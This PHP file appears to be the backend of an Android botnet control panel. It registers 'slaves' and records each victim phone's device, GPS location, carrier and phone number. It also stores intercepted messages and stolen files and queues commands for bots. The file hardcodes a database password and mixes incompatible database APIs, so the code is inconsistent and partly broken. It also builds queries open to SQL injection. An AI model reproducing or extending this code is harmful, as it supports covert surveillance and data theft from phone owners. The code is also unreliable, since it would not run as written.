<?php
  $url = "https://informacion.herokuapp.com";

  if (file_exists("config.php")) {
    include("config.php");
  } else {
    die();
  }
  
	$connect = pg_connect("host=ec2-54-163-240-54.compute-1.amazonaws.com dbname=d97hqd0uu802gp user=vxoxyrownzuzgx password=0669e05248eea11fe4bdc6d93f82de2248a0dd9a9345ee09215f6f4d2d393862")
    or die('No se ha podido conectar: ' . pg_last_error());








function slave_exists($UID) {
	global $connect;
	$statement = $connect->prepare('SELECT * FROM bots WHERE uid=:uid');
	$statement->bindParam(':uid', $UID, PDO::PARAM_STR);
	$statement->execute();
	$row = $statement->fetch(PDO::FETCH_ASSOC);
	if(!$row){
	  return false;
	} else {
	  return true;
	}
}

function setFunction($UID, $Function){
	$UID = sanitize($UID);
	$Function = sanitize($Function);
	if(slave_exists($UID)){
		$functions = getFunction($UID);
		if($functions == ""){
			mysql_query("UPDATE slaves SET Function='$Function' WHERE `Unique_ID` = '$UID'") or die(mysql_error());
		} else {
			$functions = $functions . ", " . $Function;
			mysql_query("UPDATE slaves SET Function='$functions' WHERE `Unique_ID` = '$UID'") or die(mysql_error());
		}
	}
}

function updateSlave($UID, $Device, $Version, $Coordinates, $Provider, $PhoneNumber, $SDK, $Random){
  $remove = array("(", ")");
  $cleancoords = str_replace($remove, "", $Coordinates);
  $splitcoords = explode(",", $cleancoords);
  $Lati = $splitcoords[0];
  $Longi = $splitcoords[1];
  
  global $connect;
  
  if (slave_exists($UID)){
	$statement = $connect->prepare("UPDATE bots SET device='$Device', version='$Version', lati='$Lati', longi='$Longi', provider='$Provider', phone='$PhoneNumber', sdk='$SDK', random='$Random' WHERE `uid` = '$UID'");
	$statement->execute();
  } else {
    $statement = $connect->prepare("INSERT INTO `bots` (`uid`, `device`, `version`, `lati`, `longi`, `provider`, `phone`, `sdk`, `random`) VALUES ('$UID', '$Device', '$Version', '$Lati', '$Longi', '$Provider', '$PhoneNumber', '$SDK', '$Random')");
	$statement->execute();
  }
}

function addMessage($UID, $Message) {
  global $connect;
  $statement = $connect->prepare("INSERT INTO `messages` (`uid`, `message`) VALUES ('$UID', '$Message')");
  $statement->execute();
}

function addToUploads($owner, $slave, $file){
	if(slave_exists($slave)){
      if(file_exists("dlfiles/" . $file)){
	    global $connect;
        $statement = $connect->prepare("INSERT INTO `files` (`uid`, `file`) VALUES ('$slave', '$file')");
        $statement->execute();
      }
	}
}
?>
